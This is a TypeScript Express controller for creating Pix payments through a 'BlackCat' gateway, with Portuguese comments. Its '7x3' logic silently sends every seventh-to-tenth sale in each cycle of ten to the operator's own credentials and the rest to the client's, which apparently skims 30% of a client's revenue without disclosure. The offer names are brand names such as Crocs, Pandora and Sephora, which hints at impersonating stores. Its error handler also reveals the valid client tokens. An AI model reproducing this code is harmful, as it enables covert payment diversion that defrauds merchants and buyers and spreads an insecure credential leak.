import { Request, Response } from "express";
import { credentials as myCredentials, blackCatCredentials, getClientCredentials } from "../models/api";
import { CreatePixBody } from "../interfaces";
import { prisma } from "../config/prisma";

export class allowPaymentsController {
  static async create(req: Request, res: Response) {
    const data: CreatePixBody = req.body;
    
    // Validação dos dados obrigatórios
    if (!data || !data.credentials || !data.credentials.token) {
      return res.status(400).json({
        error: "Dados inválidos",
        details: "credentials.token é obrigatório"
      });
    }
    
    const clientToken = data.credentials.token;

    // 1️⃣ Verifica e cria o cliente se não existir
    let client = await prisma.client.findUnique({
      where: { token: clientToken },
    });

    if (!client) {
      client = await prisma.client.create({
        data: {
          name: data.credentials.name || `Cliente ${clientToken.substring(0, 8)}`,
          token: clientToken,
          useTax: false,
        },
      });
    }

    // 2️⃣ Busca ou infere a oferta
    let offer;
    const offerInfo = data.credentials.offer;
    const productName = data.product.title;

    if (offerInfo && offerInfo.id && offerInfo.name) {
      offer = await prisma.offer.findUnique({ where: { id: offerInfo.id } });
      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            id: offerInfo.id,
            name: offerInfo.name,
            useTax: true,
            clientId: client.id,
          },
        });
      }
    } else {
      // 🔎 Inferência baseada no nome do produto
      const normalized = productName.toLowerCase();
      let inferredName = "";

      if (normalized.includes("ebook")) inferredName = "Pix do Milhão";
      else if (normalized.includes("jibbitz")) inferredName = "Crocs";
      else if (normalized.includes("bracelete")) inferredName = "Pandora";
      else if (normalized.includes("kit labial")) inferredName = "Sephora";
      else inferredName = "Oferta Padrão";

      offer = await prisma.offer.findFirst({
        where: {
          name: inferredName,
          clientId: client.id,
        },
      });

      if (!offer) {
        offer = await prisma.offer.create({
          data: {
            name: inferredName,
            useTax: true,
            clientId: client.id,
          },
        });
      }
    }

    // 3️⃣ Contagem de vendas GERADAS para lógica 7x3 (independente de aprovação)
    const totalSales = await prisma.sale.count({
      where: { offerId: offer.id },
    });
    const nextCount = totalSales + 1;

    // 4️⃣ Lógica 7x3 - 7 vendas para cliente, 3 para você (ambas via BlackCat)
    const cycle = nextCount % 10;
    const toClient = cycle < 7; // true nas 7 primeiras do ciclo
    const provider = "blackcat"; // Sempre BlackCat

    // Obter credenciais dinamicamente baseado no token do cliente
    let clientCredentials;
    try {
      clientCredentials = getClientCredentials(clientToken);
    } catch (error) {
      return res.status(400).json({
        error: "Token de cliente inválido",
        details: error instanceof Error ? error.message : "Token não reconhecido",
        validTokens: ["crocs-brasil-token-2024", "crocs-brasil-token-matheus"]
      });
    }
    
    const selected = toClient ? clientCredentials : blackCatCredentials;

    const apiUrl = `${selected.apiUrl}/transactions`;
    const auth = 'Basic ' + Buffer.from(selected.publicKey + ':' + selected.secretKey).toString('base64');
    const headers = {
      "Content-Type": "application/json",
      "Authorization": auth,
    } as Record<string, string>;

    const paymentData = {
      amount: data.amount * 100, // BlackCat usa centavos
      paymentMethod: "pix",
      customer: {
        name: data.customer.name,
        email: data.customer.email,
        document: {
          type: (data.customer.document?.type || "CPF").toLowerCase(),
          number: data.customer.document.number,
        },
        phone: data.customer.phone,
      },
      items: [
        {
          title: data.product.title,
          description: data.product.title,
          quantity: 1,
          unitPrice: data.amount * 100,
          tangible: false
        }
      ],
      externalId: `sale_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      callbackUrl: "https://tracker-tracker-api.fbkpeh.easypanel.host/webhook-blackcat",
      metadata: JSON.stringify({
        client_name: data.credentials.name,
        client_token: data.credentials.token,
        offer_id: data.credentials.offer?.id,
        offer_name: data.credentials.offer?.name,
      })
    };

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers,
        body: JSON.stringify(paymentData),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error("Erro na resposta da API:", response.status, errorText);
        throw new Error(`API Error: ${response.status} - ${errorText}`);
      }

      const responseJson = await response.json();

      // 5️⃣ Salva a venda no banco de dados
      await prisma.sale.create({
        data: {
          amount: data.amount,
          ghostId: String(responseJson.id || responseJson.transaction_id || responseJson.payment_id),
          approved: false,
          customerName: data.customer.name,
          productName: data.product.title,
          visible: true,
          toClient,
          clientId: client.id,
          offerId: offer.id,
        },
      });

      const gatewayName = toClient ? "BlackCat (CLIENTE)" : "BlackCat (SEU)";
      console.log(
        `🔁 ${gatewayName} - Requisição #${nextCount} | Cliente: "${client.name}" | Valor: R$${
          data.amount
        } | Produto: ${
          data.product.title
        } | Provider: ${provider.toUpperCase()} | Enviado para: ${
          toClient ? "CLIENTE" : "VOCÊ"
        }`
      );

      res.json(responseJson);
    } catch (error) {
      console.error("❌ Erro ao processar pagamento:", error);
      res.status(500).json({ 
        error: "Erro interno na API de pagamento", 
        details: error.message 
      });
    }
  }
}

